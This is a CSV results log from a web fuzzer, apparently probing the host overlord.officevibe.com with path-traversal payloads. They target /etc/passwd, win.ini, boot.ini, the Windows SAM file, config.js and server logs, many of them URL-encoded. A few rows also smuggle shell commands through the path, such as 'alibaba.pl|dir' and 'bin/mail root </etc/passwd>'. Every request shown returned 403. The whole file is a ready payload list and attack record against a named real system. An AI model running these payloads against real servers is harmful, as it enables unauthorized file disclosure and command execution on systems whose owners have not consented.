FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://overlord.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,28.405524ms,
../config.js,https://overlord.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,27.861752ms,
../../../etc/passwd,https://overlord.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,29.585306ms,
./../../../../../../../../../etc/passw*,https://overlord.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,27.920386ms,
../../boot.ini,https://overlord.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,29.309371ms,
../../../logs/error.log,https://overlord.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,28.368617ms,
..///etc/passwd,https://overlord.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,28.532615ms,
file/../../../../../../../../etc,https://overlord.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,27.927534ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://overlord.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,28.534036ms,
./../../../../../../../../../etc/*,https://overlord.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,28.286944ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,28.918813ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,31.422641ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://overlord.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,28.447055ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,31.30078ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,https://overlord.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,28.321097ms,
../.pass,https://overlord.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,28.238529ms,
../.passwd,https://overlord.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,28.603984ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,https://overlord.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,28.345826ms,
../../../../../logs/access.log,https://overlord.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,35.646207ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://overlord.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,32.540498ms,
../../apache/logs/error.log,https://overlord.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,28.211781ms,
../../../logs/access.log,https://overlord.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,28.532211ms,
../../logs/access.log,https://overlord.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,28.517225ms,
../../../../../logs/error.log,https://overlord.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,32.601347ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://overlord.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,27.813801ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,https://overlord.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,28.060515ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,https://overlord.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,28.097008ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,28.719099ms,
static/..%5c..%5cetc/passwd,https://overlord.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,27.7936ms,
..//etc/passwd;index.html,https://overlord.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,28.002493ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,28.401065ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,27.931963ms,
